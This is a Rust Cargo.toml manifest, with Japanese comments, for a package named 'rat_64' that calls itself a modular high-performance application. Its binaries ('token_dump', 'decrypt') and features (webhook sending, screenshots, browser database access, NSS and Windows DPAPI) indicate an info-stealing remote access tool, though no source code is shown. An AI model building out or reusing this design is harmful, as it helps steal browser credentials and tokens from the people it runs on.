[package]
name = "rat_64"
version = "0.1.0"
edition = "2021"
default-run = "rat_64"
description = "A high-performance Rust application with modular architecture"
license = "MIT"
readme = "README.md"

[profile.release]
opt-level = 3
lto = "fat"
codegen-units = 1
panic = "abort"
strip = "symbols"
overflow-checks = false
incremental = false
debug = false
rpath = false

[profile.dev]
opt-level = 1
debug = true
overflow-checks = true
incremental = true
debug-assertions = true

[profile.release-tiny]
inherits = "release"
opt-level = "z"
lto = "fat" 
codegen-units = 1
panic = "abort"
strip = "symbols"
debug = false
rpath = false
overflow-checks = false
debug-assertions = false

[lib]
name = "rat_64"
path = "src/lib.rs"

[[bin]]
name = "rat_64"
path = "src/main.rs"

[[bin]]
name = "decrypt"
path = "src/bin/data_decrypt.rs"

[[bin]]
name = "token_dump"
path = "src/bin/token_extractor.rs"

# ---------------------------
# 依存関係（安定運用向け設定）
# ---------------------------
[dependencies]
# Serde は std（derive つき）
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"

# 乱数：0.9系（デフォルトfeaturesのまま推奨API rng()/fill を使う）
# 旧API thread_rng() を使い続けたい場合は下のコメント行に切替
rand = "0.9.2"
# rand = { version = "0.9.2", features = ["std", "std_rng", "thread_rng"] }

# MessagePack（最小機能のみ）
rmp-serde = { version = "1.3", default-features = false }

# 基本ユーティリティ（最小化）
base64 = { version = "0.22", default-features = false, features = ["std"] }

# AEAD（最小機能のみ）
aes-gcm = { version = "0.10", default-features = false, features = ["aes", "alloc"] }

# 並列処理（必要時のみ）
# rayon = "1.11"  # 標準ライブラリのIteratorで置換

# システム情報（最小化）
whoami = { version = "1.5", default-features = false }
local_ipaddress = { version = "0.1", default-features = false }

# 段階的バイナリサイズ削減（バランス重視）
anyhow = { version = "1.0", default-features = false }  # エラー処理（最小化）
libloading = { version = "0.8", default-features = false }  # NSSで必要
which = { version = "8.0.0", default-features = false, features = ["real-sys"] }  # NSSで必要
thiserror = { version = "2.0.16", default-features = false }  # エラー処理マクロ

# 条件付き依存関係（機能別）
log = { version = "0.4", default-features = false, optional = true }  # ログ機能
indicatif = { version = "0.17", default-features = false, features = ["unicode-width"], optional = true }  # プログレスバー
chrono = { version = "0.4", default-features = false, features = ["clock", "std"], optional = true }  # 時刻処理

# 必須依存関係（最小化）
tempfile = { version = "3.8", default-features = false }
walkdir = { version = "2.3", default-features = false }

# ---- Feature設定（統一・最適化済み） ----
[features]
# デフォルト設定（最小構成）
default = ["core"]

# 基本機能セット
core = []

# 個別モジュール機能
webhook = ["dep:minreq", "dep:chrono"]       # Webhook送信（軽量HTTPクライアント）
screenshot = ["dep:image", "dep:scrap"]                   # スクリーンショット機能
browser = ["dep:rusqlite"]                                # ブラウザデータ取得機能

# UI/UX機能
progress-bar = ["dep:indicatif"]                          # プログレスバー表示
logging = ["dep:log"]                                     # ログ機能
datetime = ["dep:chrono"]                                 # 日時処理

# サイズ最適化用機能フラグ
ui-minimal = []                                           # UI要素を最小化（progress-bar除外）
crypto-minimal = []                                       # 暗号化機能を最小化
size-optimized = ["ui-minimal", "crypto-minimal"]        # 総合サイズ最適化

# データベース機能（browserのエイリアス、後方互換性のため）
database = ["browser"]

# 機能グループ（段階的構成）
basic = ["core", "browser", "datetime"]                     # 基本機能：コア + ブラウザ + 日時
extended = ["basic", "screenshot", "progress-bar"]          # 拡張機能：基本 + スクリーンショット + UI
full = ["extended", "webhook", "logging"]                   # 全機能：拡張 + Webhook + ログ

# サイズ最適化構成
compact = ["core", "browser", "size-optimized"]            # コンパクト版（3MB目標）
lite = ["core", "browser"]                                  # 軽量版（UI最小）

# 便利なエイリアス
all-modules = ["full"]                                      # 全モジュール有効
minimal = ["core"]                                          # 最小構成

# optional deps（必要時だけ読み込む）
[dependencies.minreq]
version = "2.12"
default-features = false
features = ["https-rustls"]
optional = true



[dependencies.image]
version = "0.25"
default-features = false
features = ["png"]  # JPEG不要なら削減
optional = true

[dependencies.rusqlite]
version = "0.37.0"
default-features = false
features = ["bundled", "modern_sqlite"]  # 最小限の機能のみ
optional = true

[dependencies.scrap]
version = "0.5"
optional = true

# Windows API（必要最小限のモジュール）
[target.'cfg(windows)'.dependencies]
windows = { version = "0.62.0", default-features = false, features = [
  "Win32_Foundation",
  "Win32_Security",
  "Win32_System_Threading"
] }
winapi = { version = "0.3", features = ["wincrypt", "winbase", "dpapi"] }